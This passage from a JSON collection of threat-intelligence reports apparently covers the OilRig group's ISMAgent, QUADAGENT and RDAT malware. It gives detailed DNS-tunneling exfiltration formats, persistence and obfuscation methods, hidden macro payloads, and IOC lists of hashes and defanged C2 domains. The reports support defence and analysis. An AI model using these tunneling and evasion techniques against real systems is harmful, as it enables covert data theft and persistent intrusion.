                "ISMAgent uses its DNS tunneling technique for C2 as a backup to its HTTP capability.",
                "This mechanism supports the same command message structure and even handles the commands in the same manner.",
                "The Trojan sends data to the C2 server via DNS queries by encoding data and using the encoded string as a subdomain of an actor owned domain.",
                "The C2 server can send data to the Trojan by resolving the DNS queries to IPv6 addresses that the Trojan treats as hexadecimal data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To carry out its DNS C2 communications, the Trojan will issue DNS queries to the C2 domain to obtain the AAAA records associated with the domain.",
                "The Trojan starts this process by creating a unique GUID and appending it to the string \"n.n.c.\"",
                "to create a subdomain to query in the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To respond to this beacon, the C2 domain's name server will respond to this query with a hardcoded IPv6 value of a67d:0db8:a2a1:7334:7654:4325:0370:2aa3.",
                "This value acts as an acknowledgement of the beacon.",
                "The Trojan will then base64 encode the HTTP C2 URL it was using and will send this data to the C2 by constructing and issuing the following DNS query:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan splits up the base64 encoded data across several DNS queries, which we believe the C2 domain's name server pieces together using the supplied sequence numbers.",
                "The name server will respond to each of these DNS queries with another hardcoded IPv6 value of a67d:0db8:85a3:4325:7654:8a2a:0370:7334 to notify the Trojan that it has received the data.",
                "After all of the data is successfully sent via DNS requests, the Trojan will send a final DNS query that has the following structure to notify the C2 server that it has completed its data transfer:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After notifying the C2 server that the data transfer has completed, the Trojan may issue additional DNS queries to notify it is ready to receive data back from the C2 server using the following domain name structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DNS server will then respond to these DNS queries with additional IPv6 addresses that the Trojan will treat as hexadecimal data as described by Arbor Networks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ISMAgent payload embedded inside the newest variant of Clayslide used the C2 domain ntpupdateserver[.]com.",
                "The primary second-level domain has no IP resolution, instead relying on www.ntpupdateserver[.]com for resolution then two specific subdomains of ns1.ntupdateserver[.]com and ns2.ntpupdateserver[.]com as the actual DNS C2 handler.",
                "The ISMAgent payload embedded inside the June version used a completely different C2 domain at Microsoft-publisher[.]com, but used the exact same domain name structure.",
                "Lastly, we were able to identify a third sample of ISMAgent leveraging another unique C2 domain, adobeproduct[.]com."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Primary C2 domains for ISMAgent"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pivoting from the WHOIS registrant email address of paul.mcalister[at]mail.com revealed four additional highly suspect domains:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pivoting on the WHOIS phone number we found two additional domains.",
                "These are registered with the same Registrar, have the same WHOIS address, but the registrant name bolipsAngelio and email address bolips[at]outlook.com."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Thematically, these domains follow the pattern of ISMAgent and OilRig C2 domain names, abusing typo-squatting techniques in attempts to appear as legitimate domains.",
                "Each of these additional domains had the same structure as the three ISMAgent C2 domains, with no IP resolution on the primary second-level domain containing the www, ns1, and ns2 subdomains.",
                "Based off the same registrant email address and domain name structure, it is highly probable these other domains are also part of the ISMAgent infrastructure as C2 servers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lastly, we identified another ISMAgent sample using the C2 domain of adobeproduct[.]com, which again fits thematically and was also found to have the www, ns1, and ns2 subdomains attached to it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These findings are diagrammed below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 ISMAgent C2 Infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On the surface, the ISMAgent payload appears similar to the ISMDoor payload, sharing functionality such as a specific DNS tunneling protocol.",
                "However, closer analysis shows there are enough differences between the two payloads that justifies tracking ISMAgent as its own tool with its own name."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First, all known ISMDoor payloads using DNS tunneling were created for 64-bit architectures, while all known ISMAgent are x86 only.",
                "The most recent ISMDoor payloads using DNS tunneling have abandoned HTTP as a C2 communications method compared to earlier ISMDoor samples, whereas ISMAgent uses HTTP as the primary method and DNS tunneling as a secondary method to communicate with its C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Also, while the DNS tunneling protocol is the same, the messages within the transmitted encoded data differs dramatically.",
                "After the initial \"n.n.c.\"",
                "beacon, ISMAgent sends the HTTP C2 URL as the data via the DNS tunneling protocol to send a beacon to its C2.",
                "During our analysis, we observed the sample used in this attack sending the following data immediately after the initial beacon:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comparatively, ISMDoor sends a much more involved series of messages to the C2 server in order to get a command.",
                "The following is a sequence of messages sent from the ISMDoor Trojan to its C2 server via the DNS tunneling protocol, the last message (\"M:GAC?\") resulting in a command for the Trojan to run:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lastly, the commands available within ISMAgent and ISMDoor are very different.",
                "As mentioned previously, ISMAgent has a far more limited, but flexible command set, allowing an adversary to upload and download files, in addition to command execution via command prompt.",
                "The most recent version of ISMDoor (v 10.0.192",
                "SHA256: aa52dcaf6df43c6aa872fe0f73725f61e082d32c33fc976741d4eca17679533d) on the other hand, has a more comprehensive yet more rigid command set:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our data collection process, we discovered a Clayslide delivery document (SHA256: ca8cec08b4c74cf68c71a39176bfc8ee1ae4372f98f75c892706b2648b1e7530) from September 2016 containing a payload that appeared to be the Helminth script variant as found in other Clayslide documents, but upon further examination was wholly different.",
                "The macro within this Clayslide documents obtains a PowerShell script from a cell in the Incompatible worksheet, much like previous samples.",
                "The macro then saves a VBScript to %PUBLIC%\\Libraries\\LicenseCheck.vbs to run this PowerShell script every 3 minutes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like the Helminth script variants, this PowerShell script is a malicious payload that uses both HTTP requests and DNS tunneling to interact with its C2 server.",
                "However, the HTTP requests and the protocol employed to perform DNS tunneling differs dramatically from Helminth scripts installed by all other known Clayslide samples.",
                "The HTTP requests and DNS tunneling protocol found in this PowerShell script are instead identical to ISMAgent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 domain used for this script was mslicensecheck[.]com, which had previously been reported by LogRhythm in their OilRig whitepaper.",
                "Interestingly, it was the only domain associated with OilRig that did not have an IP resolution at its second-level, much like the ISMAgent samples."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The doIt function within the PowerShell script, seen in Figure 7, is responsible for initiating the C2 communications, as well as parsing the data provided by the C2 server to run the appropriate commands.",
                "This function uses the strings /action2/, /response/ and /upload/ within the C2 URLs when using HTTP to communicate with the C2 server.",
                "This behavior and these strings were also observed in the ISMAgent C2 behavior.",
                "The doIt function also shows that the C2 server will respond with data structured the same way as ISMAgent, using # as a delimiter and various offsets such as offset 0 used in subsequent requests with the C2, offset 2 specifying a URL to download a file from, offset 3 specifying a command to execute using command-prompt, and offset 4 specifying a path to a file to upload to the C2 server."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 The 'doIt' function within the PowerShell script handles C2 interaction and functionality"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The commonalities between this PowerShell script and ISMAgent do not stop there.",
                "The HTTP requests to the C2 server use the exact same URL structure.",
                "For instance, the payload generates a URL using the following line of code, which results in a base64 encoded string that contains [hostname/username]:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Also, as seen in the code above, the PowerShell script makes sure the base64 encoded data used is safe to use in an HTTP URL, by replacing the characters \u201c=\u201d, \u201c/\u201d and \u201c+\u201d characters with hexadecimal equivalent.",
                "The ISMAgent payloads also performed the exact same replacement, as seen in the portion of code in Figure 8.\n\nFigure 8 Code within ISMAgent payload that overlaps character replacement HTTP communications functionality within PowerShell script"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DNS tunneling protocol within the PowerShell script is the same as the ISMAgent payload, which can be visualized by the following beacon sent from the PowerShell script:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To facilitate the DNS tunneling functionality, the PowerShell script replaces the =, / and + characters within the base64 data sent to the C2 server within the subdomains of DNS queries.",
                "However, DNS queries cannot include the % character, so it uses the following line of code to replace them with -, -s- and -p- instead:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "This functionality is again replicated within the ISMAgent payload for its DNS tunneling functionality, as shown in Figure 9.\n\nFigure 9 Code within ISMAgent payload that overlaps character replacement within DNS tunneling functionality within PowerShell script"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The OilRig campaign has repeatedly demonstrated a willingness and desire to be iterative in their toolset, while maintaining some level of similarities over time.",
                "In this scenario, we were able to directly observe this type of behavior, while also implement a tool thought to be previously unrelated to OilRig.",
                "With the inclusion of ISMAgent within the OilRig toolset, we are beginning to see stronger relationships between the various documented groups operating in the Middle East.",
                "This region has proven to be a hot bed of espionage motivated activity over the last couple of years, and there appear to be no signs of this changing.",
                "As our research continues, our goal will be to generate even better understandings of the true extent of the various operations in this region and the relationships between them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected and may learn more via the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clayslide delivering ISMAgent"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6\n5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMAgent payloads\nbbfc05177e5e29b3c8c4ef0148969d07e6239140da5bff57473c32409e76c070\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9\naf4d8604d0cd09b8dc01dbafc33c6d240d356cad366f9917192a2725e0121a0d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ISMAgent C2\nAdobeproduct[.]com\nntpupdateserver[.]com\nmicrosoft-publisher[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Related infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Miedafire[.]com\ntatavpnservices[.]com\nchrome-dns[.]com\nfireeyeupdate[.]com\ncache-service[.]net\nlevel3-resolvers[.]net\nMslicensecheck[.]com"
            ]
        }
    ],
    "faa38df649ae24facd349631ef16e58e125e5aab": [
        {
            "type": "paragraph",
            "content": [
                "The OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools.",
                "The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region.",
                "We first discovered this group in mid-2016, although it is possible their operations extends earlier than that time frame.",
                "They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down.",
                "Examining their past behaviors with current events only seems to indicate that the OilRig groups operations are likely to accelerate even further in the near future.",
                "Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East.",
                "Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks.",
                "The targets in these attacks included a technology services provider as well as another government entity.",
                "Both these targets were in the same nation-state.",
                "Further, the attacks against these targets were made to appear to have originated from other entities in the same country.",
                "However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks.",
                "The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye.",
                "In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as well.",
                "The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented.",
                "However, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently.",
                "Detailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog.",
                "QUADAGENT is the 12th custom built tool that Unit 42 has documented the OilRig group using for their attacks.",
                "Our analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other.",
                "Primarily, one used a Microsoft .NET Framework-based dropper that also opens a decoy dialog box, which can be seen in Figure 1.",
                "The other sample was a PE file generated via a bat2exe tool."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "QUADAGENT PE Files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only differences being the command and control server (C2) and randomized obfuscation.",
                "We were also able to locate a third delivery package of the QUADAGENT backdoor as reported by ClearSky Cyber Security.",
                "In their example, the OilRig group used a malicious macro document to deliver the backdoor, which is a tactic much more commonly used by them.",
                "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation.",
                "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses.",
                "Invoke-Obfuscation has proven to be highly effective at obfuscating PowerShell scripts and in this case, the adversary was able to take advantage of the tool for increased chances of evasion and as an anti-analysis tactic.\n\nAttack Details\nThis latest attack consisted of three waves between May and June 2018.",
                "All three waves involved a single spear phishing email that appeared to originate from a government agency based in the Middle East.",
                "Based on our telemetry, we have high confidence the email account used to launch this attack was compromised by the OilRig group, likely via credential theft.",
                "In the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were not easily discoverable via common search engines, indicating the targets were likely part of a previously collected target list, or possibly known associates of the compromised account used to send the attack emails.",
                "The malicious attachment was a simple PE file (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63) with the filename <redacted> Technical Services.exe.",
                "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files.",
                "Its sole purpose here is to install the QUADAGENT backdoor and execute it.",
                "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes.",
                "The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it.",
                "A scheduled task is also generated to maintain persistence of the payload.",
                "Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails.",
                "The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe.",
                "This PE was slightly different from the other attack, being compiled using the Microsoft .NET Framework instead of being generated via a bat2exe tool and containing a decoy dialog box as shown in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Decoy dialog box"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a method to reduce suspicion by the victim.",
                "In comparison to being silently run, a victim may be less suspicious of a dialog/error message because they are provided what appears to be a legitimate error response when attempting to open the attachment.",
                "When a file is silently run, because there is no response to the users action, a victim may be more suspicious or curious on what actually happened.",
                "After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name.",
                "The C2 techniques remained identical, with the only change being the server which became cpuproc[.]com.",
                "Using rdppath[.]com as a pivot point, we collected an additional QUADAGENT sample also communicating to this C2 (SHA256: d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de), which was first reported by ClearSky Cyber Security.",
                "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle.",
                "The use of malicious macro delivery documents is a tactic we have observed the OilRig group use repeatedly over the three years weve been tracking them.",
                "The actual QUADAGENT script payload used in the ClearSky sample was exactly the same as the one we found in the bat2exe version used against the aforementioned technical services provider.",
                "The delivery document also used a filename that could be related to other technology services or media organizations within that same nation state, although it is inconclusive.",
                "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on Enable Content as seen in Figure 2.",
                "Unlike many other delivery documents used by this group, there was no additional decoy content after the macro was enabled."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. Lure image used to entice users to enable macros"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Use of Open Source Tools\nIn an attempt to avoid detection and as an anti-analysis tactic, the OilRig group abused an open source tool called Invoke-Obfuscation to obfuscate the code used for QUADAGENT.",
                "Invoke-Obfuscation is freely available via a Github repository and allows a user to change the visual representation of a PowerShell script simply by selecting the desired obfuscation techniques.",
                "Invoke-Obfuscation offers a variety of obfuscation techniques, and by analyzing the script we were able to ascertain the specific options in this attack.",
                "After identifying the specific options used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform additional analysis.",
                "We found two obfuscation techniques applied to the script: the first one changing the representation of variables; the second one changing the representation of strings in the script.",
                "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell.",
                "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex.",
                "\"{1}{0}\" -f 'bar','foo').",
                "During our analysis, we installed Invoke-Obfuscation and used it to obfuscate a previously collected QUADAGENT sample to confirm our analysis.",
                "We used the two previously mentioned obfuscation options within Invoke-Obfuscation on this QUADAGENT sample, which resulted in the generation of a very similar script as the Office365DCOMCheck.ps1 and SystemDiskClean.ps1 payloads delivered in the attacks discussed in this blog.",
                "We captured the commands we ran in Invoke-Obfuscation in the animation in Figure 3 below, which visualizes the steps the threat actor may have taken to create the payload delivered in this attack."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Possible steps carried out in Invoke-Obfuscation on the QUADAGENT sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe OilRig group continues to be a persistent adversary group in the Middle East region.",
                "While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication.",
                "In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls.",
                "A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished.",
                "Palo Alto Networks customers may learn more and are protected via the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs\nSHA256 Hashes\nQUADAGENT\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520\nd7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63\n\nThreeDollars\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\n\nDomains\nrdppath[.]com\ncpuproc[.]com\nacrobatverify[.]com\n\nFilenames\nOffice365DCOMCheck.ps1\nOffice365DCOMCheck.vbs\nSystemDiskClean.ps1\nSystemDiskClean.vbs\nAdobeAcrobatLicenseVerify.ps1\nc:\\Users\\<username>\\AppData\\Roaming\\Out.jpg\n\nAppendix\n\nQUADAGENT Relationship to Other OilRig Tools\nDuring our regular data gathering functions several months ago, we collected a delivery document (SHA256: 1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c) that contained an at-the-time an unknown payload which would be revealed to be QUADAGENT.",
                "While we do not have data supporting targeting information or telemetry, we know the document was created in January 2018 and likely used in an attack around that time frame.",
                "In addition, the delivery document shared metadata artifacts with the ThreeDollars delivery document (SHA256: 119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc) that OilRig used to deliver the ISMAgent payload in a targeted attack In January 2018 on a government entity in the Middle East.",
                "The QUADAGENT payload dropped by the delivery document had the filename AdobeAcrobatLicenseVerify.ps1 and used acrobatverify[.]com\nfor its C2.",
                "Examining the subdomains for acrobatverify[.]com reveals three subdomains, www, resolve, and dns.",
                "The passive DNS data for the subdomains shows an IP resolution of 185.162.235[.]121 from December 2017 through January 2018.",
                "Prior to this time period, we see several subdomains of msoffice-cdn[.]com, ns1, ns2, and www also resolving to this IP.",
                "This IP and msoffice-cdn[.]com were both previously referenced in our first report on an OilRig attack using the ThreeDollars delivery document.",
                "We used this QUADAGENT payload when testing the Invoke-Obfuscation tool mentioned in this blog.",
                "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog.",
                "QUADAGENT Analysis\nThe final payload delivered in all three attack waves is a PowerShell downloader referred to by other research organizations as QUADAGENT.",
                "The downloaders in these attacks were configured to use both rdppath[.]com and cpuproc[.]com as their C2 servers.",
                "When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order.",
                "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request.",
                "If that HTTPS request is not successful, the downloader will issue an HTTP request.",
                "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications.",
                "We provide more on the specific usage of these protocols as we discuss the inner workings of this malware in this section.",
                "The downloader will use the filename of the script (ex.",
                "Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host.",
                "To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name (ex.",
                "Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The scheduled task will then run every five minutes, which provides persistent execution of the downloader script.",
                "The task itself is fairly simple, calling the VBScript file which contains a PowerShell one-liner as an argument to run the QUADAGENT payload (ex.",
                "Office365DCOMCheck.ps1 and SystemDiskClean.ps1):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex.",
                "Office365DCOMCheck or SystemDiskClean), such as the following:\n\nHKCU\\Office365DCOMCheck\n\nThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the C2 server.",
                "This registry key is empty upon the first execution of the payload.",
                "The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format:\n\n<session id>_<pre-shared key>\n\nTo obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL:\n\nhxxps://www.rdppath[.]com/\n\nIf the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL:\n\nhxxp://www.rdppath[.]com/\n\nThe code to communicate with the C2 via HTTP exists within an exception handler.",
                "To trigger this, if the HTTPS requests do not work, the payload attempts to cause an exception by dividing 1 by 0.",
                "This exception invokes the exception handler containing the HTTP communication code, allowing it to run.",
                "If either attempt is successful, the C2 server will respond with the session ID and a pre-shared key in cleartext, which it will save to the previously mentioned registry key.",
                "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie.",
                "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling.",
                "To obtain the session ID and pre-shared key, the payload will issue a query to resolve the following domain:\n\nmail.<random number between 100000 and 999999>.<c2 name>\n\nThis request notifies the C2 server that the payload is about to send system specific data as part of the initial handshake.",
                "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:\n\n<domain>\\<username>:pass\n\nThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively).",
                "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>\n\nAfter obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command.",
                "The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request's cookie in the PHPSESSID field, as seen in the example GET request:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling.",
                "The payload will issue a DNS query to the following domain to notify the C2 that it is about to send it data (session ID value) to it in a subsequent query:\n\nns1.<random number between 100000 and 999999>.<c2 name>\nThe payload does nothing with the C2 servers response to the query.",
                "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:\n\n<encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>\n\nTo transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers.",
                "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:\n\nwww.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>\n\nThe payload will treat the data provided by the C2 as a message, which will have the following structure:\n\nhello<char uuid[35]><char type[1]><data>\n\nThe message will start with the string hello followed by a 35-character UUID string.",
                "The type field specifies the command that the payload will handle.",
                "This specific variant of the payload can only handle one command type, x.",
                "The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key.",
                "The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script.",
                "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task.",
                "It will run the newly downloaded PowerShell script by running the following command via cmd /c:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload.",
                "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful.",
                "The payload will construct a message that has the following structure that it will then send to the C2:\n\nbye<char uuid[35]>d\n\nThe message above is sent via a simple HTTPS/HTTP POST request to the C2 server.",
                "If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:\n\nns1.<random number between 100000 and 999999>.<c2 name>\n\nThe payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as:\n\n<encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name>\n\nThe payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:\n\nns2.<same random number between 100000 and 999999>.<c2 name>\n\nPackage Comparison of the QUADAGENT Samples\nThe bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys.",
                "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg.",
                "The batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The .NET variant (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) is even simpler.",
                "This dropper starts by displaying the dialog box in Figure 1, previously shown and discussed with the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1.",
                "It will then execute it as a shell object:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the malicious macro attack, the same Office365DCOMCheck.ps1 script that was used in the PE version is used as the payload.",
                "When the document is opened, a lure image as shown as seen in Figure 2 is displayed in an attempt to coerce the victim to enable macros.",
                "When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The code above obtains the contents of the header, which the macro will write to a file at C:\\programdata\\Office365DCOMCheck.ps1.",
                "The creator of the delivery document was able to visually hide the PowerShell script in the header by setting the text to a font size of 2 and font color of white, as seen in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. Hidden PowerShell script within the document's header using a small white font"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This technique of hiding malicious content by using a small white font is not unique to this threat group, as we recently observed the Sofacy group use this technique to hide DDE instructions within one of their delivery documents."
            ]
        }
    ],
    "f35ab0be38b343c9c2ba4f9ced9d1dcbc4d9d36e": [
        {
            "type": "paragraph",
            "content": [
                "While analyzing an attack against a Middle Eastern telecommunications organization, we discovered a variant of an OilRig-associated tool we call RDAT using a novel email-based command and control (C2) channel that relied on a technique known as steganography to hide commands and data within bitmap images attached to emails."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In May 2020, Symantec published research on the Greenbug group targeting telecommunications organizations in Southeast Asia, involving attacks made as recently as April 2020.",
                "We observed similar tactics and tools associated with attacks on a telecommunications organization in the Middle East in April 2020, specifically using custom Mimikatz tools, Bitvise, PowerShell downloaders and a custom backdoor we track as RDAT.",
                "Unit 42 has previously linked Greenbug to OilRig, a threat group we discovered in 2015.",
                "We had first seen the RDAT tool used in OilRig's operations back in 2017, but we later found a related sample created in 2018 that used a different command and control channel.",
                "When we analyzed this sample, we found a novel email-based C2 channel used in combination with steganography to exfiltrate data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have been tracking RDAT since 2017, when we first saw this tool uploaded to a webshell related to the TwoFace webshell discussed in our Striking Oil blog published on September 26, 2017.",
                "RDAT has been under active development since 2017, resulting in multiple variations of the tool that rely on both HTTP and DNS tunneling for C2 communications.",
                "In June 2018, the developer of RDAT added the ability to use Exchange Web Services (EWS) to send and receive emails for C2 communications.",
